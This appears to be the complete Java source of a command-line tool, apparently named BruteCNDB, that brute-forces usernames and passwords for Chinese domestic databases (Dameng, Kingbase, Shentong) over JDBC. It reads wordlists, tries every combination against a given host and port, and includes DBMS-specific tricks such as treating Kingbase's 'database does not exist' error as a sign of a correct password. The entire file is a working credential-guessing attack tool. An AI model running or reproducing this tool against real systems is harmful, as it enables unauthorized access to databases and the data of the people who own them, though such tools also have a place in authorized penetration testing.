package cn.brute.db;

import org.apache.commons.cli.*;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.SocketTimeoutException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.HashMap;

public class Main {

    public static void main(String[] args) {
        try {
            HashMap<String, String[]> dbmsMap = new HashMap<String, String[]>();
            dbmsMap.put("dm", new String[]{"dm.jdbc.driver.DmDriver", "dm", "达梦数据库", "5326"});
            dbmsMap.put("jc", new String[]{"com.kingbase.Driver", "kingbase", "人大金仓数据库", "54321"});
            dbmsMap.put("jc8", new String[]{"com.kingbase8.Driver", "kingbase8", "人大金仓v8数据库", "54321"});
            dbmsMap.put("st", new String[]{"com.oscar.Driver", "oscar", "神通数据库", "2003"});

            Options options = new Options();
            options.addOption("dbms", true, "可选项: dm - 达梦; jc - 人大金仓; jc8 - 人大金仓v8; st - 神通");
            options.addOption("uf", true, "用户名字典，不指定则使用当前目录下的user.txt文件");
            options.addOption("pf", true, "密码字典，不指定则使用当前目录下的password.txt文件");
            options.addOption("h", true, "服务器IP");
            options.addOption("p", true, "端口，不指定则使用默认端口");
            options.addOption("i", true, "爆破间隔时长，默认为0，单位：毫秒");
            HelpFormatter formatter = new HelpFormatter();
            if (args.length < 2) {
                formatter.printHelp("java -jar BruteCNDB.jar -dbms dm -h 10.0.0.1 [-p 5326] -uf user.txt -pf password.txt", options);
                System.exit(1);
            }
            CommandLineParser parser = new DefaultParser();
            CommandLine cmd;
            cmd = parser.parse(options, args);

            String dbms = cmd.getOptionValue("dbms");
            String port = cmd.hasOption("p") ? cmd.getOptionValue("p") : dbmsMap.get(dbms)[3];
            String host = cmd.getOptionValue("h");
            int interval = 0;
            if (cmd.hasOption("i")) interval = Integer.parseInt(cmd.getOptionValue("i"));

            Class.forName(dbmsMap.get(dbms)[0]);
            String url = String.format("jdbc:%s://%s:%s/", dbmsMap.get(dbms)[1], host, port);

            ArrayList<String> userList = null;
            ArrayList<String> pwdList = null;
            try {
                userList = getListFromFile(cmd.hasOption("uf")?cmd.getOptionValue("uf"):"user.txt");
                pwdList = getListFromFile(cmd.hasOption("pf")?cmd.getOptionValue("pf"):"password.txt");
            } catch (IOException e) {
                e.printStackTrace();
            }
            int total = userList.size() * pwdList.size();
            int index = 1;
            System.out.println(String.format("开始爆破%s！由于是单线程，速度会比较慢....", dbmsMap.get(dbms)[2]));
            boolean success = false;
            for (String passwd : pwdList) {
                for (String userID : userList) {
                    try {
                        // 简单粗暴的百分比判断，复制粘贴就完事儿
                        Connection connection = DriverManager.getConnection(url, userID, passwd);
                        if (index == total * 0.1 || index == total * 0.2 || index == total * 0.3 || index == total * 0.4 || index == total * 0.5 || index == total * 0.6 || index == total * 0.7 || index == total * 0.8 || index == total * 0.9)
                            System.out.println(String.format("进度：%d%%", index * 100 / total));
                        index += 1;
                        System.out.println(String.format("[!] Username: %s, password: %s", userID, passwd));
                        connection.close();
                        success = true;
                        System.exit(0);
                    } catch (SQLException e) {
//                      e.printStackTrace();
                        if (e.getCause() instanceof SocketTimeoutException) {
                            System.out.println("[x] Socket连接超时");
                        } else if (e.getMessage().contains("不存在") && cmd.getOptionValue("dbms").contains("jc")) {
                            // 金仓数据库密码正确但数据库名错误时会提示"xxx"数据库不存在
                            System.out.println(String.format("[!] Username: %s, password: %s", userID, passwd));
                            success = true;
                            System.exit(0);
                        } else if (e.getMessage().contains("timed out") && cmd.getOptionValue("dbms").contains("st")) {
                            // 神通数据库连接超时会报OSSQLException异常而不是java默认的SocketTimeoutException
                            System.out.println("[x] 连接神通数据库超时");
                        }
                    }
                    Thread.sleep(interval);
                }
            }
            if (!success) System.out.println("不好意思，没爆出来。。。");

        } catch (ParseException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            System.out.println("缺少对应数据库的JDBC驱动");
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static ArrayList<String> getListFromFile(String filename) throws IOException {
        FileInputStream fis = new FileInputStream(filename);
        BufferedReader br = new BufferedReader(new InputStreamReader(fis));
        String line;
        ArrayList<String> lines = new ArrayList<>();
        while ((line = br.readLine()) != null) {
            lines.add(line.strip());
        }
        br.close();
        fis.close();
        return lines;
    }
}
